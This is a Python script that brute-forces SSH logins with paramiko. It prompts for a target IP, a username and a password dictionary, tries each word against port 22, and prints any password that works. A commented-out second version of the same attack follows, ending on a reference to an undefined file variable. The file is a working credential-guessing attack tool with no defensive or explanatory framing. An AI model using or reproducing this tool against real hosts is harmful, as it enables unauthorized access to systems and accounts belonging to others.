#!/usr/bin/env python3

import socket,os,sys,paramiko

global host, username, file

try:
    host=input("\nPlease Enter Target IP: ")
    username=input("\nPlease Enter The Username: ")
    file=input("\nPlease Enter Password Dictionary With Full Path: ")
    if os.path.exists(file) == False:
        print("\nFile Doesnt Exists :(")
        sys.exit()
    else:
        print("\nLoading The Password File :)")
except KeyboardInterrupt:
   print("\nUser Stopped The Script :(")
   sys.exit()

def ssh_connect(password,code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,port=22,username=username,password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2
    ssh.close()
    return code

file = open(file)

for word in file.readlines():
    password=word.strip("\n")
    try:
        prob=ssh_connect(password)
        if prob == 0:
            print("\nUser: %s Password: %s"%(username,password))
        elif prob == 2:
            print ("\nNetwork Error")
            sys.exit()
    except Exception:
        print(Exception)
        pass

file.close()


"""import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()"""
